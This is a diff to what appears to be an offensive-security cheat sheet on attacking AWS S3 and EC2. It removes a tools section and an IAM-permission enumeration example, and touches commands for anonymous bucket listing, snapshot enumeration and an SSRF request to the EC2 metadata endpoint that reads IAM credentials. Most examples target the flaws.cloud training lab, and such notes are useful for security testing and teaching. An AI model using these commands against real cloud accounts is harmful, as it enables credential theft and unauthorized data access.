@@ -2,7 +2,6 @@
 
 ## Summary
 
-- [Tools](#tools)
 - [AWS Configuration](#aws-configuration)
 - [Open Bucket](#open-bucket)
 - [Basic tests](#basic-tests)
@@ -13,35 +12,6 @@
 - [AWS - Extract Backup](#aws---extract-backup)
 - [Bucket juicy data](#bucket-juicy-data)
 
-## Tools
-
-- [Pacu - The AWS exploitation framework, designed for testing the security of Amazon Web Services environments](https://github.com/RhinoSecurityLabs/pacu)
-- [Bucket Finder - Search for readable buckets and list all the files in them](https://digi.ninja/)
-	```powershell
-	wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
-	./bucket_finder.rb my_words
-	./bucket_finder.rb --region ie my_words
-		US Standard         = http://s3.amazonaws.com
-		Ireland             = http://s3-eu-west-1.amazonaws.com
-		Northern California = http://s3-us-west-1.amazonaws.com
-		Singapore           = http://s3-ap-southeast-1.amazonaws.com
-		Tokyo               = http://s3-ap-northeast-1.amazonaws.com
-
-	./bucket_finder.rb --download --region ie my_words
-	./bucket_finder.rb --log-file bucket.out my_words
-	```
-- [Boto3 - Amazon Web Services (AWS) SDK for Python](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)
-	```python
-	import boto3
-	# Create an S3 client
-	s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')
-
-	try:
-		result = s3.list_buckets()
-		print(result)
-	except Exception as e:
-		print(e)
-	```
 
 ## AWS Configuration
 
@@ -105,7 +75,7 @@ eg: http://redacted/avatar/123%C0
 
 ```bash
 aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
-aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
+aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
 ```
 
 You can get the region with a dig and nslookup
@@ -157,7 +127,7 @@ $ aws --profile flaws sts get-caller-identity
 
 
 $ aws --profile profile_name ec2 describe-snapshots
-$ aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
+$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2
 "SnapshotId": "snap-XXXX342abd1bdcb89",
 
 Create a volume using snapshot
@@ -184,34 +154,6 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 ```
 
 For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
-
-
-## Enumerate IAM permissions
-
-Enumerate the permissions associated with AWS credential set with [enumerate-iam](https://github.com/andresriancho/enumerate-iam)
-
-```powershell
-git clone git@github.com:andresriancho/enumerate-iam.git
-cd enumerate-iam/
-pip install -r requirements.txt
-./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
-2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id "AKIA..."
-2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked!
-2019-05-10 15:58:01,537 - 21345 - [INFO] -- {
-    "RoleDetailList": [
-        {
-            "Tags": [], 
-            "AssumeRolePolicyDocument": {
-                "Version": "2008-10-17", 
-                "Statement": [
-                    {
-...
-2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked!
-2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked!
-2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked!
-2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked!
-2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked!
-```
 
 ## References
 
